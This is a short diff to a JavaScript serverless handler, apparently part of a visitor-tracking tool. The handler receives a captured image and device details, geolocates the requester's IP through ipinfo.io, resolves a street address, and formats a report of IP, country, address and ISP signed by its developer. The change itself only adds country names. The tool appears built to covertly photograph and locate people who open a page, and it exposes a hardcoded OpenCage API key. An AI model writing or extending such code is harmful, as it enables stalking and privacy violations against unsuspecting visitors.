@@ -4,6 +4,15 @@ import UAParser from "ua-parser-js";
 
 const OPENCAGE_KEY = "136e90f2e15c46fda280cbc59b05cfda";
 
+const countryNames = {
+  ID: "Indonesia",
+  US: "United States",
+  MY: "Malaysia",
+  SG: "Singapore",
+  IN: "India",
+  // Tambahkan negara lain sesuai kebutuhan
+};
+
 export default async function handler(req, res) {
   try {
     const { image, deviceInfo } = req.body;
@@ -21,7 +30,10 @@ export default async function handler(req, res) {
     const ipInfoRes = await fetch(`https://ipinfo.io/${ip}/json`);
     const ipInfo = await ipInfoRes.json();
 
-    const lokasi = `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`;
+    const countryCode = ipInfo.country || "XX";
+    const countryName = countryNames[countryCode] || countryCode;
+
+    const lokasi = `${ipInfo.city}, ${ipInfo.region}, ${countryCode}`;
     const isp = ipInfo.org || "Unknown ISP";
     const timezone = ipInfo.timezone || "Asia/Jakarta";
     const waktu = new Date().toLocaleString("id-ID", { timeZone: timezone });
@@ -36,6 +48,7 @@ export default async function handler(req, res) {
 
     const caption = `Dev By @FazrrEdan
 IP: ${ip}
+Negara: ${countryName}
 Lokasi: ${lokasi}
 Alamat: ${alamatLengkap}
 ISP: ${isp}
